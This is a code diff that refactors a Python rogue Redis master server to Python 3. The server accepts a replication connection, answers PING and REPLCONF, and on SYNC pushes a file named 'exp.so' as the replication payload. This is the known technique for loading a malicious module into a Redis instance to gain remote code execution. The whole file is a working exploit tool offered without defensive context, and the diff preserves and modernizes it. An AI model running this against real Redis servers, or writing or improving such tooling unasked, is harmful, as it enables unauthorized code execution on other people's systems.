@@ -1,67 +1,56 @@
 #!/usr/local/bin python
-#coding=utf8
+#coding=utf-8
 import socket
-import time
 
-CRLF="\r\n"
-payload=open("exp.so","rb").read()
-exp_filename="exp.so"
+CRLF = "\r\n"
 
 def redis_format(arr):
-    global CRLF
-    global payload
-    redis_arr=arr.split(" ")
-    cmd=""
-    cmd+="*"+str(len(redis_arr))
+    redis_arr = arr.split(" ")
+    cmd = "*" + str(len(redis_arr))
     for x in redis_arr:
-        cmd+=CRLF+"$"+str(len(x))+CRLF+x
-    cmd+=CRLF
-    return cmd
+        cmd += CRLF + "$" + str(len(x)) + CRLF + x
+    cmd += CRLF
+    return cmd.encode("utf-8")
 
-def redis_connect(rhost,rport):
-    sock=socket.socket()
-    sock.connect((rhost,rport))
+def redis_connect(rhost, rport):
+    sock = socket.socket()
+    sock.connect((rhost, rport))
     return sock
 
-def send(sock,cmd):
+def send(sock, cmd):
     sock.send(redis_format(cmd))
     print(sock.recv(1024).decode("utf-8"))
 
 def RogueServer(lport):
-    global CRLF
-    global payload
-    flag=True
-    result=""
-    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.bind(("0.0.0.0",lport))
+    with open("exp.so", "rb") as f:
+        payload = f.read()
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(("0.0.0.0", lport))
     sock.listen(10)
+    print(f"\033[92m[+]\033[0m Listening on port {lport}...")
+    
     clientSock, address = sock.accept()
+    print(f"\033[92m[+]\033[0m Accepted connection from {address[0]}:{address[1]}")
     
-    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(address[0], address[1]))
-    
-    while flag:
-        data = clientSock.recv(1024)
+    while True:
+        data = clientSock.recv(1024).decode("utf-8", errors="ignore")
         if "PING" in data:
-            result="+PONG"+CRLF
-            clientSock.send(result)
-            flag=True
+            clientSock.send(b"+PONG" + CRLF.encode())
         elif "REPLCONF" in data:
-            result="+OK"+CRLF
-            clientSock.send(result)
-            flag=True
+            clientSock.send(b"+OK" + CRLF.encode())
         elif "PSYNC" in data or "SYNC" in data:
-            result = "+FULLRESYNC " + "a" * 40 + " 1" + CRLF
-            result += "$" + str(len(payload)) + CRLF
-            result = result.encode()
-            result += payload
-            result += CRLF
-            clientSock.send(result)
+            response = b"+FULLRESYNC " + b"a" * 40 + b" 1" + CRLF.encode()
+            response += b"$" + str(len(payload)).encode() + CRLF.encode()
+            response += payload + CRLF.encode()
+            clientSock.send(response)
             print("\033[92m[+]\033[0m FULLRESYNC ...")
-            flag=False
-            
-    print("\033[92m[+]\033[0m It's done")
+            break
     
-if __name__=="__main__":
-
-    lport=6666
+    print("\033[92m[+]\033[0m It's done")
+    clientSock.close()
+    sock.close()
+    
+if __name__ == "__main__":
+    lport = 6666
     RogueServer(lport)
